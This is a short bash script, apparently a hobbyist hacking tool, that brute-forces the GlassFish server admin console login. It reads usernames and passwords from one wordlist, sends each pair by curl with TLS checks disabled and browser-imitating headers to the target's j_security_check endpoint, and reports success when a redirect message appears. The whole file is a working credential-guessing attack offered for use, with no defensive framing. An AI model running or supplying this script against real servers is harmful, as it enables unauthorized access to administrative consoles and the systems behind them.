#!/bin/bash

# Read command-line arguments
if [[ $# -ne 3 ]]; then
  echo "Usage: ./script.sh <wordlist_path> <host_ip> <port>"
  exit 1
fi

wordlist="$1"
host="$2"
port="$3"

if [[ ! -f "$wordlist" ]]; then
  echo "Wordlist file not found: $wordlist"
  exit 1
fi

# Define color codes and formatting options
green='\033[0;32m'
greenbold='\033[1;32m'
red='\033[0;31m'
reset='\033[0m'

# Display the colored output
echo -e "${red}Brute Force Glass Fish${reset}"
echo -e "${greenbold}   by : Tiger3080${reset}"
echo -e "${green}Using wordlist: $wordlist${reset}"
echo -e "${green}Target: $host:$port${reset}"

success=false

while IFS= read -r username; do
  while IFS= read -r password; do
    response=$(curl -s -X POST \
      -k \
      -H "Host: $host:$port" \
      -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" \
      -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" \
      -H "Accept-Language: en-US,en;q=0.5" \
      -H "Referer: https://$host:$port/common/index.jsf" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Origin: https://$host:$port" \
      -H "Upgrade-Insecure-Requests: 1" \
      -H "Connection: close" \
      -d "j_username=$username&j_password=$password&loginButton=Login&loginButton.DisabledHiddenField=true" \
      "https://$host:$port/common/j_security_check")

    echo -n "Attempt: Username: $username, Password: $password  Status: "
    if [[ $response == *"This document has moved"* ]]; then
      echo -e "${greenbold}Success!${reset}"
      success=true
      break 2
    else
      echo -e "${red}Not successful.${reset}"
    fi
  done < "$wordlist"
  if [[ "$success" == true ]]; then
    break
  fi
done < "$wordlist"

if [[ "$success" == false ]]; then
  echo "All attempts failed. The document move was not detected."
fi